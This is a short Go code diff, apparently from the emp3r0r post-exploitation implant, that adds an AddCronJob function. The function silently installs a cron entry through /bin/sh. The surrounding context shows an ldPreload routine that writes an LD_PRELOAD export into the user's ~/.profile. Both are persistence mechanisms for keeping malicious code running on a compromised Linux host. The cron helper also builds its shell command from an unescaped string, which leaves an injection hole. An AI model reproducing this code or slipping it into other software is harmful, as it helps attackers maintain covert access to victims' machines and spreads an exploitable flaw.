@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"os/exec"
 	"os/user"
 	"strings"
 )
@@ -158,6 +159,14 @@ func ldPreload() error {
 	}
 	return AppendToFile(u.HomeDir+"/.profile", "export LD_PRELOAD="+Libemp3r0rFile)
 
+}
+
+// AddCronJob add a cron job without terminal
+// this creates a cron job for whoever runs the function
+func AddCronJob(job string) error {
+	cmdStr := fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", job)
+	cmd := exec.Command("/bin/sh", "-c", cmdStr)
+	return cmd.Start()
 }
 
 func injector() (err error) {
